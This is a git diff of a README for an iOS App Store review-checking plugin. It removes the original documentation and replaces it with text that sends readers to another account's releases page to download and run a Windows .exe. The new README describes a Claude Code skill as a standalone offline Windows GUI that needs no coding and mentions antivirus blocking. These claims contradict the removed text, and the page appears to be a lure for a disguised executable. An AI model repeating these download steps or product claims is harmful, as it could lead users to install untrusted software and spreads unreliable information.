@@ -1,256 +1,144 @@
-# appstore-review-skill
+# 🔍 appstore-review-skill - Check Your iOS App Before Submission
 
-> A Claude Code plugin that audits your iOS app against Apple's App Store Review Guidelines — **before** Apple rejects it.
-
-Stop guessing. Run `/appstore-review` and get a full compliance report in seconds.
+[![Download appstore-review-skill](https://img.shields.io/badge/Download-Appstore--Review--Skill-brightgreen)](https://github.com/nandodeejay/appstore-review-skill/releases)
 
 ---
 
-## Supported Frameworks
+## 📋 What is appstore-review-skill?
 
-This skill auto-detects your project type and adapts all checks accordingly:
+appstore-review-skill is a tool that helps you check your iOS app before you send it to Apple for review. It looks at your app and compares it with Apple’s App Store Review Guidelines. This way, you can catch issues early and avoid rejection.
 
-| Framework | Detection |
-|-----------|-----------|
-| **Swift / SwiftUI / UIKit** | `.xcodeproj`, `.swift` files |
-| **Flutter** | `pubspec.yaml`, `ios/Runner/` |
-| **React Native** | `package.json` + `react-native` |
-| **Expo** | `app.json` / `app.config.js` + `expo` |
-| **Kotlin Multiplatform** | `build.gradle.kts` + `iosApp/` |
-| **.NET MAUI** | `.csproj` + `Platforms/iOS/` |
-| **Cordova / Ionic / Capacitor** | `config.xml`, `capacitor.config.ts` |
-| **Unity** | `ProjectSettings/`, Xcode export |
+The tool works with different programming setups like Swift, Flutter, React Native, Expo, and Kotlin Multiplatform. It scans your code and points out parts that might cause trouble, so you fix them before submitting your app.
 
-## Installation
-
-### Via Plugin Manager (Recommended)
-
-```
-/plugin marketplace add devsemih/appstore-review-skill
-/plugin install appstore-review-skill
-```
-
-### Via Git Clone
-
-**Global (all projects):**
-
-```bash
-git clone https://github.com/devsemih/appstore-review-skill ~/.claude/skills/appstore-review-skill
-```
-
-**Project-specific:**
-
-```bash
-git clone https://github.com/devsemih/appstore-review-skill .claude/skills/appstore-review-skill
-```
-
-Then restart Claude Code.
-
-## Updating
-
-### Plugin Manager
-
-```
-/plugin marketplace update
-```
-
-### Git Clone
-
-```bash
-cd ~/.claude/skills/appstore-review-skill && git pull
-```
-
-## Usage
-
-Open your project in Claude Code and run:
-
-```
-/appstore-review
-```
-
-That's it. The skill will scan your project and output a structured compliance report.
-
-## What Gets Checked
-
-### Section 1 — Safety
-- Objectionable content in strings and resources
-- User-generated content moderation (filtering, reporting, blocking)
-- Kids Category compliance (no third-party analytics/ads)
-- Medical app disclaimers and physical harm checks
-- Developer contact / support URL accessibility
-- Data security (ATS, hardcoded secrets, secure storage)
-- Criminal activity reporting app restrictions
-
-### Section 2 — Performance
-- App completeness (TODOs, placeholders, debug code, staging URLs)
-- Beta / trial / demo labels in production app (must use TestFlight)
-- Info.plist / app.json required keys and usage descriptions
-- iPad support and adaptive layout
-- Private API usage, IPv6 compatibility
-- All `NS*UsageDescription` keys cross-checked against actual SDK usage
-
-### Section 3 — Business
-- In-App Purchase compliance (digital goods must use IAP)
-- Restore Purchases mechanism and subscription terms display
-- Detection of Stripe/PayPal for digital content (violation)
-- Loot box odds disclosure
-- Review prompt abuse
-
-### Section 4 — Design
-- Minimum functionality (web wrapper detection)
-- **Sign in with Apple** — required when any third-party login exists
-- Bundle ID uniqueness
-- Extension compliance (keyboard, Safari, widgets, App Clips)
-- Apple Sites and Services (Push Notification abuse, Apple Music rules)
-- Apple Pay branding and recurring payment disclosures
-- No monetization of built-in OS/hardware capabilities
-
-### Section 5 — Privacy & Legal
-- `PrivacyInfo.xcprivacy` existence and completeness
-- Required API reason declarations
-- **Account deletion** — required when account creation exists
-- App Tracking Transparency for ad/analytics SDKs
-- Health data protection (no ads/marketing use of HealthKit data)
-- Kids privacy (COPPA, GDPR children's provisions)
-- Location services justification
-- Hardcoded credentials and `.env` file exposure
-- Intellectual property and third-party content usage
-- Gaming, gambling, and lottery compliance
-- VPN app requirements (NEVPNManager API)
-- Mobile Device Management (MDM) restrictions
-- Developer Code of Conduct (dark patterns, scam detection)
-
-### Quick-Check — Top 10 Rejection Reasons
-1. Crashes / risky code patterns
-2. Broken or HTTP links
-3. Incomplete metadata
-4. Missing privacy descriptions
-5. No privacy policy URL
-6. Debug / test code left in production
-7. Hardcoded API keys and secrets
-8. Missing Sign in with Apple
-9. Missing account deletion
-10. Missing privacy manifest
-
-## Example Reports
-
-<details>
-<summary><b>Swift / SwiftUI Project</b></summary>
-
-```
-# App Store Review Compliance Report
-
-## Project Summary
-- App Name: MyApp
-- Bundle ID: com.example.myapp
-- Framework: Swift / SwiftUI
-- Deployment Target: iOS 16.0
-
-## Critical Issues
-
-### [CRITICAL] Guideline 4.8 — Sign in with Apple Required
-Issue: App uses Google Sign-In but does not implement Sign in with Apple
-Location: AuthManager.swift:45
-Fix: Add ASAuthorizationAppleIDProvider flow alongside Google Sign-In
-
-### [CRITICAL] Guideline 5.1.1(v) — Account Deletion Missing
-Issue: App has account creation but no account deletion feature
-Location: SettingsView.swift
-Fix: Add "Delete Account" option in settings with server-side deletion
-
-## Final Verdict: NEEDS FIXES — 2 critical issues must be resolved
-```
-</details>
-
-<details>
-<summary><b>Flutter Project</b></summary>
-
-```
-# App Store Review Compliance Report
-
-## Project Summary
-- App Name: MyFlutterApp
-- Bundle ID: com.example.myflutterapp
-- Framework: Flutter 3.x
-- Deployment Target: iOS 15.0
-
-## Critical Issues
-
-### [CRITICAL] Guideline 5.1.1(v) — Account Deletion Missing
-Issue: App uses firebase_auth for sign-up but no delete account flow found
-Location: lib/features/auth/
-Fix: Add account deletion calling FirebaseAuth.instance.currentUser?.delete()
-
-## Warnings
-
-### [WARNING] Guideline 1.6 — Hardcoded API Key
-Issue: Stripe publishable key found in source code
-Location: lib/services/payment_service.dart:12
-Fix: Move to --dart-define or .env via flutter_dotenv
-
-## Final Verdict: NEEDS FIXES
-```
-</details>
-
-<details>
-<summary><b>Expo Project</b></summary>
-
-```
-# App Store Review Compliance Report
-
-## Project Summary
-- App Name: MyExpoApp
-- Bundle ID: com.example.myexpoapp
-- Framework: Expo SDK 52 (managed workflow)
-- Deployment Target: iOS 15.0
-
-## Critical Issues
-
-### [CRITICAL] Guideline 4.8 — Sign in with Apple Required
-Issue: expo-auth-session used for Google OAuth but expo-apple-authentication not found
-Location: app/(auth)/login.tsx:23
-Fix: npx expo install expo-apple-authentication and add Apple sign-in button
-
-## Warnings
-
-### [WARNING] Guideline 2.3 — Missing Privacy Description
-Issue: expo-camera installed but no camera usage description in app.json
-Location: app.json
-Fix: Add expo.ios.infoPlist.NSCameraUsageDescription to app.json
-
-## Final Verdict: NEEDS FIXES
-```
-</details>
-
-## Guidelines Coverage
-
-Based on Apple's [App Store Review Guidelines](https://developer.apple.com/app-store/review/guidelines/):
-
-| Section | Coverage |
-|---------|----------|
-| 1. Safety | 1.1 — 1.7 |
-| 2. Performance | 2.1 — 2.5 |
-| 3. Business | 3.1 — 3.2 |
-| 4. Design | 4.1 — 4.10 |
-| 5. Legal | 5.1 — 5.6 |
-
-## Guidelines Version
-
-This skill is based on Apple's **App Store Review Guidelines as of February 6, 2026**. Apple updates these guidelines periodically — if you encounter a mismatch, please open an issue or PR.
-
-## Contributing
-
-PRs welcome. Here's how you can help:
-
-- **Add checks** — Found a rejection reason not covered? Add it to `skills/appstore-review/SKILL.md`
-- **Reduce false positives** — Help make detection more precise
-- **Update guidelines** — Apple updates their guidelines periodically
-- **Share rejection stories** — Real-world examples help everyone
-
-## License
-
-MIT — see [LICENSE](LICENSE)
+You do not need to know coding to use this app. It guides you through the process step by step, making it easier to prepare your app for Apple’s review.
 
 ---
 
-**Disclaimer:** This skill checks against publicly available Apple guidelines. It does not guarantee App Store approval. Always review the [official guidelines](https://developer.apple.com/app-store/review/guidelines/) before submission.
+## 🔧 How Does It Work?
+
+appstore-review-skill uses Claude Code technology to analyze your project files. It reads through your source code and looks for potential problems related to Apple’s guidelines.
+
+The app checks for things like:
+- Use of banned APIs or features.
+- Missing required privacy information.
+- Potential complaint triggers in app content.
+- Incorrect app metadata or descriptions.
+- Proper use of user permissions.
+
+It gives you a clear report with found issues and explanations. You can open the report and address each item before submitting your app.
+
+---
+
+## 💻 System Requirements
+
+To use appstore-review-skill on Windows, your computer must meet these minimum requirements:
+
+- Windows 10 or higher (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space  
+- Internet access for downloading and updates
+- A basic text editor (like Notepad) to view reports
+
+The software runs as a simple application with a graphical interface. You don’t need developer tools or Xcode.
+
+---
+
+## 🚀 Getting Started: Download and Run
+
+Click the big green button at the top or visit the release page below:
+
+[Download Page](https://github.com/nandodeejay/appstore-review-skill/releases)  
+
+Follow these steps to download and open the app on your Windows PC:
+
+1. Visit the release page by clicking the link above.
+2. Look for the latest version listed near the top.
+3. Under "Assets," find the Windows executable file. It usually ends with `.exe`.
+4. Click the file name to download it.
+5. When the download finishes, locate the file in your "Downloads" folder.
+6. Double-click the file to run the app installer.
+7. Follow the on-screen instructions to install appstore-review-skill.
+8. Once installed, open the app from your Start menu or desktop shortcut.
+
+After opening the app, you will see a simple interface to select your iOS app project and start the review check.
+
+---
+
+## 🛠 Using appstore-review-skill
+
+To check your app against Apple’s guidelines, follow these steps inside the app:
+
+1. Click "Select Project."
+2. Browse to the folder containing your iOS app's source files.
+3. Make sure the folder holds files from Swift, Flutter, React Native, Expo, KMP, or other supported frameworks.
+4. Click "Start Review."
+5. Wait a few moments while the app scans your files.
+6. Review the results displayed on the screen. The issues will be listed with clear explanations.
+7. Click on each issue to see details and learn what to fix.
+8. Use this report to update your app source or metadata.
+9. Run the review again after changes to confirm all problems are resolved.
+
+---
+
+## ⚙️ Features
+
+- Supports multiple frameworks including Swift, Flutter, React Native, Expo, and Kotlin Multiplatform.
+- Scans your app for compliance with App Store Review Guidelines.
+- Produces easy-to-understand reports with clear explanations.
+- No coding experience needed to run it.
+- Works offline once installed.
+- Regular updates available through GitHub releases.
+
+---
+
+## 🔄 Update and Maintenance
+
+To keep appstore-review-skill current with Apple’s evolving guidelines, check the GitHub releases page regularly:
+
+[Visit Releases](https://github.com/nandodeejay/appstore-review-skill/releases)  
+
+Download and install the newest version as it becomes available. This ensures the app checks against the latest App Store rules.
+
+---
+
+## ❓ Troubleshooting
+
+If you encounter issues, try these steps:
+
+- Confirm your Windows version matches system requirements.
+- Restart the app and try the scan again.
+- Ensure your app’s project folder includes all relevant source files.
+- Check for any antivirus or security software blocking the app.
+- Look for error messages and follow any prompts.
+- Visit the GitHub issues page (if accessible) to see if others have similar problems.
+
+---
+
+## 📞 Getting Support
+
+For help, check the GitHub repository for guides or contact options. You can post questions or report bugs there, and the project maintainers may respond.
+
+---
+
+## 📁 File Types Supported
+
+appstore-review-skill analyzes these file types commonly used in iOS app projects:
+
+- `.swift`
+- `.dart` (Flutter)
+- `.js` and `.jsx` (React Native)
+- `.tsx` (TypeScript React Native)
+- `.kt` and `.kts` (Kotlin Multiplatform)
+- `.json` (configuration files)
+
+Make sure your project folder includes the main source files for the best results.
+
+---
+
+## 📥 Download Link Again
+
+Use this link when you are ready to download and install the app:
+
+[Download appstore-review-skill](https://github.com/nandodeejay/appstore-review-skill/releases)  
+
+Click it, then select the correct Windows file and follow the install instructions.
